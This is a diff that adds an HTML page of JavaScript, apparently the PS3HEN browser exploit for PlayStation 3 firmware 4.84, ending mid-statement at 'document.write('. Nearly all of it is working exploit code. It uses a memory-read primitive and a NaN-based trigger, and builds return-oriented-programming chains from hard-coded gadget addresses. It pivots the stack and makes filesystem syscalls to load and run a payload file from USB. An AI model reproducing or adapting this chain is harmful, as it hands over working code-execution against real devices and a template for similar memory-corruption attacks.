@@ -1,0 +1,1239 @@
+<html lang="en">
+  <body>
+    <script>
+      var xtra_data,
+        stack_frame,
+        jump_2,
+        jump_1,
+        xtra_data_addr,
+        stack_frame_addr,
+        jump_2_addr,
+        jump_1_addr,
+        index_key = "DA7D4B5E499A4F53B1C1A14A7484443B",
+        start_x = "xxxx",
+        offset_array = [],
+        t_out = 0,
+        ps3xploit_ecdsa_key_addr = 0,
+        index_key_addr = 0,
+        search_max_threshold = 73400320,
+        search_base = 2148532224,
+        mbytes = 1048576,
+        search_size = 2 * mbytes,
+        search_base_off = 0,
+        search_size_ext = 0,
+        gtemp_addr = 2365587456,
+        total_loops = 0,
+        max_loops = 20,
+        frame_fails = 0,
+        sp_exit = 2413354176,
+        ffs = 4294967295,
+        dbyte41 = 16705,
+        dbyte00 = 0,
+        byte_size = 1,
+        hword_size = 2,
+        word_size = 4,
+        dword_size = 8,
+        stat_size_offset = 40,
+        toc_addr = 7296336,
+        // default_vsh_pub_toc = 7263652,
+        // vsh_opd_patch = 617820,
+        // vsh_opd_addr = 7256936,
+        // vsh_ps3xploit_key_toc = 7370612,
+        // toc_entry1_addr = 7185360,
+        // toc_entry2_addr = 7494200,
+        // toc_entry3_addr = 7185352,
+        // toc_entry4_addr = 7602176,
+        // toc_entry5_addr = 7255744,
+        // toc_entry6_addr = 0,
+        gadget1_addr = 620036,
+        // gadget2_addr = 6332484,
+        // gadget3_addr = 872540,
+        // gadget4_addr = 2267192,
+        // gadget5_addr = 1227548,
+        // gadget6_addr = 6380604,
+        // gadget7_addr = 131024,
+        gadget8_addr = 131072,
+        gadget_mod1_addr = 6352696,
+        gadget_mod2_addr = 80756,
+        gadget_mod3_addr = 757248,
+        gadget_mod4a_addr = 890500,
+        gadget_mod7_addr = 108204,
+        gadget_mod8_addr = 2862264,
+        gadget_mod4b_addr = 0x42c778,
+        gadget_mod4c_addr = 0x054af0,
+        gadget_mod15_addr = 0x39d038,
+        gadget_mod12_addr = 0x63315c,
+        gadget_mod9_addr = 0x010b20,
+        ua = navigator.userAgent,
+        fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),
+        // dlcount = 1,
+        progress_msg_frag1 = "<h1>Enabling <s>H\u24d4N</s> ",
+        progress_msg_frag2 = "%</h1>",
+        fail_msg_frag =
+          '<div id="c" class="fail"></div><div id="d"><s>H\u24d4N</s> <b>Exploit initialization failed!</b></div>',
+        sc_fs_open = 0x321,
+        sc_fs_read = 0x322,
+        sc_fs_write = 0x323,
+        sc_fs_close = 0x324,
+        sc_fs_stat = 0x328;
+
+      if (fwv == "4.84") {
+        (toc_addr = 7296344),
+          // default_vsh_pub_toc = 7263660,
+          // vsh_opd_patch = 617820,
+          // vsh_opd_addr = 7256944,
+          // vsh_toc_addr_screenshot = 7472764,
+          // vsh_ps3xploit_key_toc = 7370860,
+          // toc_entry1_addr = 7185360,
+          // toc_entry2_addr = 7494456,
+          // toc_entry3_addr = 7185352,
+          // toc_entry4_addr = 7602176,
+          // toc_entry5_addr = 7255752,
+          // toc_entry6_addr = 0,
+          (gadget1_addr = 620036),
+          // gadget2_addr = 6332644,
+          // gadget3_addr = 872540,
+          // gadget4_addr = 2267192,
+          // gadget5_addr = 1227548,
+          // gadget6_addr = 6380764,
+          // gadget7_addr = 131024,
+          (gadget8_addr = 131072),
+          // gadget9_addr = 170760,
+          // gadget10_addr = 6479908,
+          // gadget11_addr = 5874864,
+          // gadget12_addr = 820812,
+          // gadget13_addr = 4777384,
+          // gadget14_addr = 4769696,
+          // gadget15_addr = 4758664,
+          (gadget_mod1_addr = 6352856),
+          (gadget_mod2_addr = 80756),
+          (gadget_mod3_addr = 757248),
+          (gadget_mod4a_addr = 890500),
+          (gadget_mod4b_addr = 4376440),
+          (gadget_mod4c_addr = 346864),
+          // gadget_mod5_addr = 4339932,
+          // gadget_mod6_addr = 134144,
+          (gadget_mod7_addr = 108204),
+          (gadget_mod8_addr = 2862264),
+          (gadget_mod9_addr = 68384),
+          // gadget_mod10_addr = 1857428,
+          // gadget_mod11_addr = 1618244,
+          (gadget_mod12_addr = 6500860),
+          // gadget_mod13_addr = 3369072,
+          // gadget_mod14_addr = 6502656,
+          (gadget_mod15_addr = 3788856);
+        // gadget_mod16_addr = 5206828;
+      }
+
+      function showResult(str) {
+        document.getElementById("result").innerHTML = str;
+      }
+
+      function syscall_r3_p2p(sc, r3_ptr, r4, r5, r6, r7, r8, r9, r10, r31out) {
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        return (
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod1_addr) +
+          fill_by_16bytes(0x50, dbyte41) +
+          fill_by_4bytes(0xc, dbyte41) +
+          hexw2bin(sc) +
+          hexw2bin(r10) +
+          hexw2bin(r8) +
+          hexw2bin(r7) +
+          hexw2bin(r6) +
+          hexw2bin(r5) +
+          hexw2bin(r4) +
+          fill_by_4bytes(0x4, dbyte41) +
+          hexw2bin(r9) +
+          fill_by_16bytes(0x20, dbyte41) +
+          hexdw2bin(r3_ptr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod4b_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function syscall_r3r5_p2p(
+        sc,
+        r3_ptr,
+        r4,
+        r5_ptr,
+        r6,
+        r7,
+        r8,
+        r9,
+        r10,
+        r31out
+      ) {
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        return (
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod1_addr) +
+          fill_by_16bytes(0x50, dbyte41) +
+          fill_by_4bytes(0xc, dbyte41) +
+          hexw2bin(sc) +
+          hexw2bin(r10) +
+          hexw2bin(r8) +
+          hexw2bin(r7) +
+          hexw2bin(r6) +
+          fill_by_4bytes(0x4, dbyte41) +
+          hexw2bin(r4) +
+          fill_by_4bytes(0x4, dbyte41) +
+          hexw2bin(r9) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(r5_ptr - 0x4) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_8bytes(0x18, dbyte41) +
+          hexdw2bin(gadget_mod4c_addr) +
+          fill_by_16bytes(0xb0, dbyte41) +
+          hexdw2bin(r3_ptr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod4b_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function copy_file_overwrite(
+        frm,
+        to,
+        fd_frm,
+        fd_to,
+        buf,
+        rlen,
+        wlen,
+        stat,
+        nl,
+        st_size
+      ) {
+        return (
+          memcpy(stat + stat_size_offset, nl, dword_size) +
+          syscall(sc_fs_stat, frm, stat, 0, 0, 0, 0, 0, 0) +
+          memcpy(st_size, stat + stat_size_offset, word_size) +
+          syscall(sc_fs_open, frm, fs_flag_readonly, fd_frm, 0, 0, 0, 0, 0) +
+          syscall_r3r5_p2p(
+            sc_fs_read,
+            fd_frm,
+            buf,
+            stat + stat_size_offset,
+            rlen,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ) +
+          syscall_r3_p2p(sc_fs_close, fd_frm, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
+          validate_word_from_ptr(rlen + 0x4, to, 0) +
+          syscall(sc_fs_open, to, fs_flag_create, fd_to, fs_mode, nl, 0, 0, 0) +
+          syscall_r3r5_p2p(
+            sc_fs_write,
+            fd_to,
+            buf,
+            stat + stat_size_offset,
+            wlen,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ) +
+          syscall_r3_p2p(sc_fs_close, fd_to, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+        );
+      }
+
+      function load_r3_word_from_ptr_32(
+        offset,
+        r26out,
+        r27out,
+        r28out,
+        r29out,
+        r30out,
+        r31out
+      ) {
+        return (
+          hexdw2bin(gadget_mod3_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          hexdw2bin(offset - 0x8) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod15_addr) +
+          fill_by_16bytes(0x50, dbyte41) +
+          fill_by_8bytes(0x8, dbyte41) +
+          hexdw2bin(r26out) +
+          hexdw2bin(r27out) +
+          hexdw2bin(r28out) +
+          hexdw2bin(r29out) +
+          hexdw2bin(r30out) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function validate_word_from_ptr(
+        w_ptr,
+        opt_store,
+        val,
+        r29out,
+        r30out,
+        r31out
+      ) {
+        if (r29out === null) {
+          r29out = gtemp_addr;
+        }
+
+        if (r30out === null) {
+          r30out = gtemp_addr;
+        }
+
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        return (
+          load_r3_word_from_ptr_32(
+            w_ptr,
+            gtemp_addr,
+            gtemp_addr,
+            gtemp_addr,
+            gtemp_addr,
+            opt_store,
+            gtemp_addr
+          ) +
+          hexdw2bin(gadget_mod12_addr) +
+          fill_by_16bytes(0x70, dbyte00) +
+          fill_by_8bytes(0x8, dbyte00) +
+          hexdw2bin(val) +
+          fill_by_16bytes(0x10, dbyte00) +
+          hexdw2bin(r29out) +
+          hexdw2bin(r30out) +
+          hexdw2bin(r31out) +
+          hexdw2bin(val) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function hexh2bin(hex_val) {
+        return String.fromCharCode(hex_val);
+      }
+
+      function hexw2bin(hex_val) {
+        return (
+          String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val)
+        );
+      }
+
+      function hexdw2bin(hex_val) {
+        return hexw2bin(0) + hexw2bin(hex_val);
+      }
+
+      String.prototype.toHex16 = function() {
+        return ("0000" + this).substr(-4);
+      };
+
+      String.prototype.toAscii = function(hex_16) {
+        var ascii = "";
+
+        var i = 0;
+
+        while (i < this.length) {
+          if (hex_16 === true) {
+            ascii += this.charCodeAt(i)
+              .toString(16)
+              .toHex16();
+          } else {
+            ascii += this.charCodeAt(i).toString(16);
+          }
+          i += 1;
+        }
+
+        return ascii;
+      };
+
+      String.prototype.convert = function(ascii) {
+        if (this.length < 1) {
+          return "";
+        }
+
+        var asciistr = "";
+        var asciichr = "";
+        var i = 0;
+        var ret = [];
+
+        if (ascii === true) {
+          asciistr = this;
+        } else {
+          asciistr = this.toAscii();
+        }
+
+        while (asciistr.length % 4 !== 0) {
+          asciistr += "00";
+        }
+
+        if (asciistr.substr(asciistr.length - 3, 2) !== "00") {
+          asciistr += "0000";
+        }
+
+        while (i < asciistr.length) {
+          asciichr = asciistr.substr(i, 4);
+
+          ret.push(String.fromCharCode(parseInt(asciichr, 16)));
+
+          i += 4;
+        }
+
+        return ret.join("");
+      };
+
+      String.prototype.convertedSize = function(ascii) {
+        if (this.length < 1) {
+          return 0;
+        }
+
+        var asciistr = "";
+
+        if (ascii === true) {
+          asciistr = this;
+        } else {
+          asciistr = this.toAscii();
+        }
+
+        while (asciistr.length % 4 !== 0) {
+          asciistr += "00";
+        }
+
+        if (asciistr.substr(asciistr.length - 3, 2) !== "00") {
+          asciistr += "0000";
+        }
+
+        return asciistr.length / 2;
+      };
+
+      String.prototype.replaceAt = function(index, ch) {
+        return this.substr(0, index) + ch + this.substr(index + ch.length);
+      };
+
+      String.prototype.repeat = function(num) {
+        return new Array(num + 1).join(this);
+      };
+
+      Number.prototype.noExponents = function() {
+        var data = String(this).split(/[eE]/);
+
+        if (data.length === 1) {
+          return data[0];
+        }
+
+        var z = "",
+          sign = this < 0 ? "-" : "",
+          str = data[0].replace(".", ""),
+          mag = Number(data[1]) + 1;
+
+        if (mag < 0) {
+          z = sign + "0.";
+
+          while (mag++) {
+            z += "0";
+          }
+
+          return z + str.replace(/^\-/, "");
+        }
+
+        mag -= str.length;
+
+        while (mag--) {
+          z += "0";
+        }
+
+        return str + z;
+      };
+
+      function fromIEEE754(bytes, ebits, fbits) {
+        var retNumber = 0;
+
+        var bits = [];
+
+        var i;
+
+        var j;
+
+        var byte;
+
+        for (i = bytes.length; i; i -= 1) {
+          byte = bytes[i - 1];
+
+          for (j = 8; j; j -= 1) {
+            bits.push(byte % 2 ? 1 : 0);
+            byte = byte >> 1;
+          }
+        }
+
+        bits.reverse();
+
+        var str = bits.join("");
+
+        var bias = (1 << (ebits - 1)) - 1;
+
+        var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
+
+        var e = parseInt(str.substring(1, 1 + ebits), 2);
+
+        var f = parseInt(str.substring(1 + ebits), 2);
+
+        if (e === (1 << ebits) - 1) {
+          retNumber = f !== 0 ? NaN : s * Infinity;
+        } else if (e > 0) {
+          retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
+        } else if (f !== 0) {
+          retNumber = s * Math.pow(2, -(bias - 1)) * (f / Math.pow(2, fbits));
+        } else {
+          retNumber = s * 0;
+        }
+
+        return retNumber.noExponents();
+      }
+
+      function generateIEEE754(address, size) {
+        var hex = new Array(
+          (address >> 24) & 0xff,
+
+          (address >> 16) & 0xff,
+
+          (address >> 8) & 0xff,
+
+          address & 0xff,
+
+          (size >> 24) & 0xff,
+
+          (size >> 16) & 0xff,
+
+          (size >> 8) & 0xff,
+
+          size & 0xff
+        );
+
+        return fromIEEE754(hex, 11, 52);
+      }
+
+      function generateExploit(address, size) {
+        var n = (address << 32) | ((size >> 1) - 1);
+
+        return generateIEEE754(address, n - address);
+      }
+
+      function readMemory(address, size) {
+        if (document.getElementById("exploit")) {
+          document.getElementById("exploit").style.src =
+            "local(" + generateExploit(address, size) + ")";
+        }
+      }
+
+      function checkMemory(address, size, len) {
+        if (document.getElementById("exploit")) {
+          readMemory(address, size);
+
+          return document.getElementById("exploit").style.src.substr(6, len);
+        }
+      }
+
+      function trigger(exploit_addr) {
+        if (document.getElementById("trigger")) {
+          document.getElementById("trigger").innerHTML = -parseFloat(
+            "NAN(ffffe" + exploit_addr.toString(16) + ")"
+          );
+        }
+      }
+
+      function load_check() {
+        if (total_loops < max_loops) {
+          //showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
+
+          t_out = setTimeout(initROP, 500, false);
+        } else {
+          total_loops = 0;
+
+          showResult(fail_msg_frag);
+
+          t_out = 0;
+        }
+      }
+      function load_check2() {
+        if (total_loops < max_loops) {
+          //showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
+
+          t_out = setTimeout(initROP2, 500, false);
+        } else {
+          total_loops = 0;
+
+          showResult(fail_msg_frag);
+          2;
+
+          t_out = 0;
+        }
+      }
+
+      function findJsVariableOffset(name, exploit_data, base, size) {
+        readMemory(base, size);
+
+        var dat = document.getElementById("exploit").style.src.substr(6, size);
+
+        var i = 0;
+
+        var t;
+
+        var k;
+
+        var match;
+
+        var exploit_addr;
+
+        while (i < dat.length * 2) {
+          if (dat.charCodeAt(i / 2) === exploit_data.charCodeAt(0)) {
+            match = 0;
+
+            for (k = 0; k < exploit_data.length * 2; k += 0x2) {
+              if (
+                dat.charCodeAt((i + k) / 2) !== exploit_data.charCodeAt(k / 2)
+              ) {
+                break;
+              }
+
+              match += 1;
+            }
+
+            if (match === exploit_data.length) {
+              exploit_addr = base + i + 4;
+
+              for (t = 0; t < offset_array.length; t += 1) {
+                if (offset_array[t] === exploit_addr) {
+                  return -1;
+                }
+              }
+
+              offset_array.push(exploit_addr);
+
+              return exploit_addr;
+            }
+          }
+
+          i += 0x10;
+        }
+
+        var end_range = base + size;
+
+        return 0;
+      }
+
+      function memcpy(dest, src, len) {
+        return callsub(gadget8_addr, dest, src, len, 0, 0, 0, 0, 0, 0, 0x70);
+      }
+
+      function stack_frame_hookup() {
+        return (
+          unescape("\u4141\u2A2F") +
+          hexw2bin(gadget1_addr) +
+          hexw2bin(toc_addr) +
+          fill_by_16bytes(0x20, dbyte41) +
+          hexdw2bin(toc_addr) +
+          fill_by_16bytes(0x70, dbyte41)
+        );
+      }
+
+      function stack_frame_exit() {
+        return hexdw2bin(gadget_mod8_addr) + unescape("\u2F2A");
+      }
+
+      function syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out) {
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        return (
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod1_addr) +
+          fill_by_16bytes(0x50, dbyte41) +
+          fill_by_4bytes(0xc, dbyte41) +
+          hexw2bin(sc) +
+          hexw2bin(r10) +
+          hexw2bin(r8) +
+          hexw2bin(r7) +
+          hexw2bin(r6) +
+          hexw2bin(r5) +
+          hexw2bin(r4) +
+          fill_by_4bytes(0x4, dbyte41) +
+          hexw2bin(r9) +
+          fill_by_16bytes(0x20, dbyte41) +
+          hexdw2bin(r3) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod4a_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function callsub(
+        sub,
+        r3,
+        r4,
+        r5,
+        r6,
+        r7,
+        r8,
+        r9,
+        r10,
+        r11,
+        sub_frame_size,
+        r31in,
+        r31out
+      ) {
+        var min_stack_size = 0x20;
+
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        if (r31in === null) {
+          r31in = gtemp_addr;
+        }
+
+        return (
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod1_addr) +
+          fill_by_16bytes(0x50, dbyte41) +
+          fill_by_4bytes(0xc, dbyte41) +
+          hexw2bin(r11) +
+          hexw2bin(r10) +
+          hexw2bin(r8) +
+          hexw2bin(r7) +
+          hexw2bin(r6) +
+          hexw2bin(r5) +
+          hexw2bin(r4) +
+          fill_by_4bytes(0x4, dbyte41) +
+          hexw2bin(r9) +
+          fill_by_16bytes(0x20, dbyte41) +
+          hexdw2bin(r3) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(r31in) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(sub) +
+          fill_by_16bytes(sub_frame_size - min_stack_size, dbyte00) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function fillNbytes(nbytes, hex_val, N) {
+        var stemp = "",
+          iterator = 0,
+          tmp = hexh2bin(hex_val);
+
+        while (iterator < nbytes / N) {
+          stemp += tmp.repeat(N / 2);
+          iterator++;
+        }
+
+        return stemp;
+      }
+
+      function fill_by_4bytes(nbytes, hex_val) {
+        return fillNbytes(nbytes, hex_val, 4);
+      }
+
+      function fill_by_8bytes(nbytes, hex_val) {
+        return fillNbytes(nbytes, hex_val, 8);
+      }
+
+      function fill_by_16bytes(nbytes, hex_val) {
+        return fillNbytes(nbytes, hex_val, 16);
+      }
+
+      function store_word(store_offset, val, r29out, r30out, r31out) {
+        if (r29out === null) {
+          r29out = gtemp_addr;
+        }
+
+        if (r30out === null) {
+          r30out = gtemp_addr;
+        }
+
+        if (r31out === null) {
+          r31out = gtemp_addr;
+        }
+
+        return (
+          hexdw2bin(gadget_mod3_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(val) +
+          fill_by_8bytes(0x8, dbyte41) +
+          hexdw2bin(store_offset - 0xc74) +
+          fill_by_16bytes(0x10, dbyte41) +
+          hexdw2bin(gadget_mod7_addr) +
+          fill_by_16bytes(0x70, dbyte41) +
+          hexdw2bin(r29out) +
+          hexdw2bin(r30out) +
+          hexdw2bin(r31out) +
+          hexdw2bin(sp_exit) +
+          fill_by_8bytes(0x8, dbyte41)
+        );
+      }
+
+      function strncmp(str1, str2, n) {
+        str1 = str1.substring(0, n);
+        str2 = str2.substring(0, n);
+        return str1 == str2 ? 0 : str1 > str2 ? 1 : -1;
+      }
+
+      function rop_exit_hen(fail) {
+        // // operations to execute on ROP exit
+        var chk = "53434500";
+        var chk2 = checkMemory(0x8a000000, 0x10, 3);
+        chk2 = chk2.toAscii(true);
+        if (strncmp(chk, chk2, 4) != 0) {
+          showResult(
+            '<div id="c" class="fail"></div><b>Failed! Rebooting!</b>'
+          );
+          initROP2(true);
+        } else {
+          window.close();
+        }
+      }
+
+      function initROP2(init) {
+        try {
+          if (init === true) {
+            frame_fails = 0;
+            search_base_off = 0;
+            search_size_ext = 0;
+            total_loops = 0;
+          }
+
+          if (t_out !== 0) {
+            clearTimeout(t_out);
+            t_out = 0;
+          }
+
+          offset_array = [];
+
+          stack_frame_addr = 0;
+
+          jump_2_addr = 0;
+
+          jump_1_addr = 0;
+
+          search_max_threshold = 70 * 0x100000;
+
+          search_base = 0x80100000;
+
+          search_size = 2 * mbytes;
+
+          search_base_off = 0 * mbytes;
+
+          search_size_ext = 0 * mbytes;
+
+          total_loops++;
+
+          // store_idx_arr1 = [];
+
+          // store_idx_arr2 = [];
+
+          stack_frame = stack_frame_hookup() + stack_frame_swap(0x8a060000);
+
+          while (stack_frame_addr === 0) {
+            if (search_max_threshold < search_size + search_size_ext) {
+              frame_fails++;
+              if (frame_fails % 10 === 0) {
+                search_base_off += 0;
+                search_size_ext += 0;
+              }
+              load_check2();
+              return;
+            }
+
+            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
+
+            stack_frame_addr = findJsVariableOffset(
+              "stack_frame",
+              stack_frame,
+              search_base + search_base_off,
+              search_size + search_size_ext
+            );
+
+            if (stack_frame_addr == -1)
+              if (search_max_threshold < search_size + search_size_ext) {
+                frame_fails++;
+                load_check2();
+                return;
+              }
+
+            search_max_threshold -= search_size + search_size_ext;
+          }
+
+          jump_2 =
+            unescape("\u0102\u7EFB") +
+            fill_by_16bytes(0x30, 0x8282) +
+            hexw2bin(stack_frame_addr) +
+            unescape("\uFB7E");
+
+          while (jump_2_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check2();
+              return;
+            }
+
+            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
+
+            jump_2_addr = findJsVariableOffset(
+              "jump_2",
+              jump_2,
+              search_base,
+              search_size
+            );
+
+            if (jump_2_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check2();
+                return;
+              }
+
+            search_max_threshold -= search_size;
+          }
+
+          jump_1 =
+            unescape("\u4141\u7EFA") +
+            hexw2bin(jump_2_addr) +
+            unescape("\uFA7E");
+
+          while (jump_1_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check2();
+              return;
+            }
+
+            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
+
+            jump_1_addr = findJsVariableOffset(
+              "jump_1",
+              jump_1,
+              search_base,
+              search_size
+            );
+
+            if (jump_1_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check2();
+                return;
+              }
+
+            search_max_threshold -= search_size;
+          }
+
+          var sf = checkMemory(
+            stack_frame_addr - 0x4,
+            0x8000,
+            stack_frame.length
+          );
+
+          var j2 = checkMemory(jump_2_addr - 0x4, 0x1000, jump_2.length);
+
+          var j1 = checkMemory(jump_1_addr - 0x4, 0x1000, jump_1.length);
+
+          if (j2 === jump_2 && j1 === jump_1 && sf === stack_frame) {
+            if (t_out !== 0) {
+              clearTimeout(t_out);
+            }
+
+            // showResult('<h1>Enabling <b>H\u24d4N<b>...</h1>');
+            setTimeout(trigger, 1000, jump_1_addr);
+          } else {
+            load_check2();
+          }
+        } catch (e) {
+          showResult(
+            "H\u24d4N installation failed because the following exception was thrown during execution: " +
+              e +
+              " at: " +
+              e.lineNumber
+          );
+        }
+      }
+
+      function initROP(init) {
+        try {
+          if (init === true) {
+            frame_fails = 0;
+            search_base_off = 0;
+            search_size_ext = 0;
+          }
+
+          if (t_out !== 0) {
+            clearTimeout(t_out);
+            t_out = 0;
+          }
+
+          offset_array = [];
+
+          xtra_data_addr = 0;
+
+          stack_frame_addr = 0;
+
+          jump_2_addr = 0;
+
+          jump_1_addr = 0;
+
+          search_max_threshold = 70 * 0x100000;
+
+          search_base = 0x80100000;
+
+          search_size = 2 * mbytes;
+
+          search_base_off = 0 * mbytes;
+
+          search_size_ext = 0 * mbytes;
+
+          total_loops++;
+
+          // store_idx_arr1 = [];
+
+          // store_idx_arr2 = [];
+
+          var usb_sp = "/dev_usb000/PS3HEN.BIN";
+
+          xtra_data =
+            start_x.convert() +
+            usb_sp.convert() +
+            index_key.convert(true) +
+            unescape("\uFD7E");
+
+          while (xtra_data_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+
+            xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7efd));
+
+            xtra_data_addr = findJsVariableOffset(
+              "xtra_data",
+              xtra_data,
+              search_base,
+              search_size
+            );
+
+            search_max_threshold -= search_size;
+          }
+
+          var usb_fp_addr = xtra_data_addr + start_x.convertedSize() - 0x4;
+
+          index_key_addr = usb_fp_addr + usb_sp.convertedSize();
+
+          stack_frame =
+            stack_frame_hookup() +
+            syscall(0x321, usb_fp_addr, 0, 0x8e000000, 0, 0, 0, 0, 0) +
+            syscall_r3r5_p2p(
+              0x322,
+              0x8e000000,
+              0x8a000000,
+              0x300000,
+              0x8e000008,
+              0,
+              0,
+              0,
+              0,
+              0,
+              0
+            ) +
+            stack_frame_swap(0x8a000000);
+
+          while (stack_frame_addr === 0) {
+            if (search_max_threshold < search_size + search_size_ext) {
+              frame_fails++;
+              if (frame_fails % 10 === 0) {
+                search_base_off += 0;
+                search_size_ext += 0;
+              }
+              load_check();
+              return;
+            }
+
+            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
+
+            stack_frame_addr = findJsVariableOffset(
+              "stack_frame",
+              stack_frame,
+              search_base + search_base_off,
+              search_size + search_size_ext
+            );
+
+            if (stack_frame_addr == -1)
+              if (search_max_threshold < search_size + search_size_ext) {
+                frame_fails++;
+                load_check();
+                return;
+              }
+
+            search_max_threshold -= search_size + search_size_ext;
+          }
+
+          jump_2 =
+            unescape("\u0102\u7EFB") +
+            fill_by_16bytes(0x30, 0x8282) +
+            hexw2bin(stack_frame_addr) +
+            unescape("\uFB7E");
+
+          while (jump_2_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+
+            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
+
+            jump_2_addr = findJsVariableOffset(
+              "jump_2",
+              jump_2,
+              search_base,
+              search_size
+            );
+
+            if (jump_2_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check();
+                return;
+              }
+
+            search_max_threshold -= search_size;
+          }
+
+          jump_1 =
+            unescape("\u4141\u7EFA") +
+            hexw2bin(jump_2_addr) +
+            unescape("\uFA7E");
+
+          while (jump_1_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+
+            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
+
+            jump_1_addr = findJsVariableOffset(
+              "jump_1",
+              jump_1,
+              search_base,
+              search_size
+            );
+
+            if (jump_1_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check();
+                return;
+              }
+
+            search_max_threshold -= search_size;
+          }
+
+          var sf = checkMemory(
+            stack_frame_addr - 0x4,
+            0x8000,
+            stack_frame.length
+          );
+
+          var x = checkMemory(xtra_data_addr - 0x4, 0x1000, xtra_data.length);
+
+          var j2 = checkMemory(jump_2_addr - 0x4, 0x1000, jump_2.length);
+
+          var j1 = checkMemory(jump_1_addr - 0x4, 0x1000, jump_1.length);
+
+          if (
+            j2 === jump_2 &&
+            j1 === jump_1 &&
+            x === xtra_data &&
+            sf === stack_frame
+          ) {
+            if (t_out !== 0) {
+              clearTimeout(t_out);
+            }
+
+            // showResult('<h1>Enabling <b>H\u24d4N<b>...</h1>');
+            triggerX();
+          } else {
+            load_check();
+          }
+        } catch (e) {
+          showResult(
+            "H\u24d4N installation failed because the following exception was thrown during execution: " +
+              e +
+              " at: " +
+              e.lineNumber
+          );
+        }
+      }
+
+      function stack_frame_swap(new_stack_addr) {
+        return (
+          hexdw2bin(gadget_mod2_addr) +
+          fill_by_16bytes(0x60, dbyte41) +
+          hexdw2bin(gtemp_addr) +
+          hexdw2bin(new_stack_addr) +
+          fill_by_8bytes(0x8, dbyte41) +
+          hexdw2bin(gadget_mod9_addr)
+        );
+      }
+
+      function triggerX() {
+        setTimeout(trigger, 1000, jump_1_addr);
+
+        setTimeout(rop_exit_hen, 4500, "<b>H\u24d4N Failed!</b>");
+
+        t_out = 0;
+
+        total_loops = 0;
+      }
+
+      function logAdd() {}
+      document.write(
